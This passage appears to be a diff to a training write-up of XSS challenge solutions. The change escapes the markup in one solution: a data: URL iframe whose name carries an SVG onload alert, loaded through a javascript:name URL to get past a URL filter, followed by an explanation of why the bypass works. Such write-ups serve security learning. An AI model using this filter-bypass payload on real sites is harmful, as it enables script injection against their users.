@@ -23,7 +23,7 @@ Use top.postmessage({uname:"test"},\*)
 
 ### This strict URL filter should prevent XSS, right?
 
-solution: data:text/html,<iframe name="<svg onload=alert(document.domain)>" src=https://www.bugbountytraining.com/challenges/challenge-6.php?url=javascript:name>
+solution: data:text/html,\<iframe name="\<svg onload=alert(document.domain)\>" src=https://www.bugbountytraining.com/challenges/challenge-6.php?url=javascript:name\>
 
 explanation: When using the javascript pseudo scheme, if the returned value is a string, browsers will write it onto the page like document.write. This is why some bookmarklets have a void(0) at the end to prevent the results accidentally return a string.
 
